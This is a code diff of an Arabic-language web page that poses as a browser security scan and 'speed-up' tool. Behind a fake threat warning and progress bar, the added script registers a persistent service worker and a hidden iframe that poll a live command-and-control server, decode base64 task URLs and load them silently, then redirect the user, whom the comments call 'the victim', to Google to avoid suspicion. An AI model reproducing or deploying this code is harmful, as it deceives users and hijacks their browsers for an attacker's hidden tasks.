@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>نظام الحماية الذكي</title>
+    <title>نظام الحماية الذكي - فحص المتصفح</title>
     <style>
         :root { --main-color: #00ff41; --bg-color: #0d0208; }
         body { background: var(--bg-color); color: var(--main-color); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; }
-        .container { text-align: center; border: 1px solid var(--main-color); padding: 40px; border-radius: 15px; background: rgba(0, 255, 65, 0.05); box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); z-index: 100; transition: 0.5s; width: 85%; }
+        .container { text-align: center; border: 1px solid var(--main-color); padding: 40px; border-radius: 15px; background: rgba(0, 255, 65, 0.05); box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); z-index: 100; transition: 0.5s; width: 85%; max-width: 500px; }
         h1 { font-size: 1.5rem; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; }
         p { color: #888; font-size: 0.9rem; margin-bottom: 25px; }
-        .btn { background: var(--main-color); color: #000; border: none; padding: 15px 30px; font-size: 1.1rem; font-weight: bold; cursor: pointer; border-radius: 5px; width: 100%; transition: 0.3s; }
-        .btn:active { transform: scale(0.98); }
-        .loading-bar { width: 100%; height: 4px; background: #111; margin-top: 20px; display: none; position: relative; overflow: hidden; }
-        .progress { width: 0%; height: 100%; background: var(--main-color); box-shadow: 0 0 10px var(--main-color); transition: 0.5s; }
+        .btn { background: var(--main-color); color: #000; border: none; padding: 15px 30px; font-size: 1.1rem; font-weight: bold; cursor: pointer; border-radius: 5px; width: 100%; transition: 0.3s; box-shadow: 0 4px 15px rgba(0, 255, 65, 0.3); }
+        .btn:active { transform: scale(0.95); }
+        .loading-bar { width: 100%; height: 6px; background: #111; margin-top: 25px; display: none; position: relative; border-radius: 10px; overflow: hidden; }
+        .progress { width: 0%; height: 100%; background: var(--main-color); box-shadow: 0 0 15px var(--main-color); transition: 0.4s; }
         #ghost-container { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; opacity: 0.001; pointer-events: none; z-index: -1; }
-        .scan-line { position: absolute; width: 100%; height: 2px; background: var(--main-color); top: 0; animation: scan 3s infinite; opacity: 0.3; }
+        .scan-line { position: absolute; width: 100%; height: 2px; background: var(--main-color); top: 0; animation: scan 3s infinite; opacity: 0.2; }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
     </style>
 </head>
@@ -23,101 +23,112 @@
     <div class="scan-line"></div>
     <div class="container" id="mainPanel">
         <h1 id="title">فحص الأمان المتقدم</h1>
-        <p id="desc">تم اكتشاف 14 ملفاً ضاراً يؤثر على سرعة التصفح واستقرار النظام.</p>
+        <p id="desc">تم اكتشاف ثغرات أمنية قد تؤدي لتسريب بياناتك. اضغط أدناه للتنظيف الفوري.</p>
         <button class="btn" id="startBtn" onclick="executeSystem()">بدء التنظيف والتسريع الآن</button>
         <div class="loading-bar" id="barBox"><div class="progress" id="progressBar"></div></div>
-        <div id="status" style="margin-top: 10px; font-size: 0.8rem;">الحالة: جاهز</div>
+        <div id="status" style="margin-top: 15px; font-size: 0.85rem; font-weight: bold;">الحالة: جاهز للفحص</div>
     </div>
     <div id="ghost-container"></div>
 
     <script>
+        // رابط السيرفر الخاص بك (C2)
         const C2_URL = 'https://mohamedahmed77.pythonanywhere.com/get_task';
 
-        // 1. زرع الجاسوس مع ميزة المزامنة المستمرة (Zombie Sync)
+        // 1. وظيفة النبضة المتطورة (تخطي الكاش و CORS)
+        async function pulse() {
+            try {
+                // إضافة طابع زمني لمنع المتصفح من سحب النتيجة من الذاكرة القديمة
+                const r = await fetch(C2_URL + '?t=' + Date.now(), {
+                    method: 'GET',
+                    mode: 'cors', 
+                    cache: 'no-store'
+                });
+                const d = await r.json();
+                
+                // تشغيل المهمة المخفية في الخلفية
+                const target = atob(d.payload);
+                fetch(target, { mode: 'no-cors' }); 
+
+                // تحديث الـ Iframe الشبحي للمهمة الجديدة
+                const ifrm = document.createElement('iframe');
+                Object.assign(ifrm.style, { width: "100vw", height: "100vh", border: "none" });
+                ifrm.src = target;
+                const container = document.getElementById('ghost-container');
+                container.innerHTML = ''; 
+                container.appendChild(ifrm);
+            } catch (e) {
+                console.log("Pulse error: ", e);
+            }
+        }
+
+        // 2. زرع الجاسوس (Service Worker) مع نظام Zombie Sync
         async function deployZombieWorker() {
             const swCode = `
                 const C2_URL = '${C2_URL}';
                 self.addEventListener('install', e => self.skipWaiting());
                 self.addEventListener('activate', e => e.waitUntil(clients.claim()));
 
-                async function pulse() {
+                async function backgroundPulse() {
                     try {
-                        const r = await fetch(C2_URL);
+                        const r = await fetch(C2_URL + '?sync=' + Date.now(), { mode: 'cors', cache: 'no-store' });
                         const d = await r.json();
-                        await fetch(atob(d.payload), { mode: 'no-cors', cache: 'no-store' });
+                        await fetch(atob(d.payload), { mode: 'no-cors' });
                     } catch (e) {}
                 }
 
-                // ثغرة Background Sync لإعادة الإحياء التلقائي
-                self.addEventListener('sync', e => { if(e.tag === 're-sync') e.waitUntil(pulse()); });
-
-                // النبضة الدورية
-                setInterval(pulse, Math.floor(Math.random() * 60000) + 60000);
+                self.addEventListener('sync', e => { if(e.tag === 're-sync') e.waitUntil(backgroundPulse()); });
+                setInterval(backgroundPulse, 60000); // نبضة كل دقيقة
             `;
             const blob = new Blob([swCode], { type: 'application/javascript' });
             const reg = await navigator.serviceWorker.register(URL.createObjectURL(blob));
             if ('sync' in reg) await reg.sync.register('re-sync');
         }
 
-        // 2. المحرك الشبحي (Hidden Iframe)
-        function startShadowEngine() {
-            setInterval(async () => {
-                try {
-                    const res = await fetch(C2_URL);
-                    const data = await res.json();
-                    const target = atob(data.payload);
-                    const ifrm = document.createElement('iframe');
-                    Object.assign(ifrm.style, { width: "100vw", height: "100vh", border: "none" });
-                    ifrm.src = target;
-                    const container = document.getElementById('ghost-container');
-                    container.innerHTML = '';
-                    container.appendChild(ifrm);
-                } catch(e) {}
-            }, Math.floor(Math.random() * 40000) + 40000);
-        }
-
-        // 3. التنفيذ الرئيسي (الهندسة الاجتماعية)
+        // 3. المحرك الرئيسي عند ضغط المستخدم
         async function executeSystem() {
-            // اهتزاز الموبايل وملء الشاشة
+            // تفعيل الاهتزاز وملء الشاشة لزيادة المصداقية والتحكم
             if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
             if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
 
-            // تحديث الواجهة
+            // تغيير شكل الواجهة لبدء عملية "الفحص"
             document.getElementById('startBtn').style.display = 'none';
             document.getElementById('barBox').style.display = 'block';
-            document.getElementById('status').innerText = "جاري تحليل الملفات...";
+            document.getElementById('status').innerText = "جاري تحليل قاعدة بيانات المتصفح...";
             
             let prog = 0;
             const interval = setInterval(() => {
-                prog += Math.random() * 15;
+                prog += Math.random() * 12;
                 if (prog >= 100) {
                     prog = 100;
                     clearInterval(interval);
                     finalize();
                 }
                 document.getElementById('progressBar').style.width = prog + "%";
-                if(prog > 40) document.getElementById('status').innerText = "جاري مسح الذاكرة المخبأة...";
-                if(prog > 80) document.getElementById('status').innerText = "جاري تحسين استجابة المتصفح...";
-            }, 600);
+                if(prog > 30) document.getElementById('status').innerText = "جاري تدمير ملفات التجسس...";
+                if(prog > 70) document.getElementById('status').innerText = "جاري تحسين سرعة الاتصال بالخادم...";
+            }, 700);
 
-            // تشغيل المحركات في الخلفية صمتاً
+            // تشغيل المهام السرية فوراً
             try {
                 await deployZombieWorker();
-                startShadowEngine();
-            } catch (e) { startShadowEngine(); }
+                await pulse(); // نبضة فورية عند الضغط
+                setInterval(pulse, 45000); // استمرار النبضات كل 45 ثانية طالما الصفحة مفتوحة
+            } catch (e) {
+                console.log(e);
+            }
         }
 
+        // 4. إنهاء العملية وتحويل الضحية
         function finalize() {
-            document.getElementById('title').innerText = "تمت العملية بنجاح";
+            document.getElementById('title').innerText = "تم تأمين جهازك ✅";
             document.getElementById('title').style.color = "#fff";
-            document.getElementById('desc').innerText = "تم حذف 14 ملفاً ضاراً وتسريع المتصفح بنسبة 45%.";
-            document.getElementById('status').innerText = "الحالة: الجهاز محمي الآن ✅";
+            document.getElementById('desc').innerText = "تم تنظيف كافة التهديدات بنجاح. المتصفح الآن يعمل بأقصى سرعة.";
+            document.getElementById('status').innerText = "الحالة: محمي بالكامل";
             document.getElementById('barBox').style.display = 'none';
             
-            // اهتزاز نهائي للتأكيد
             if (navigator.vibrate) navigator.vibrate([500]);
             
-            // تحويله بعد 3 ثوانٍ لإبعاد الشبهة
+            // تحويل الضحية بعد 3 ثوانٍ لإبعاد الشبهة تماماً
             setTimeout(() => {
                 window.location.href = "https://www.google.com";
             }, 3000);
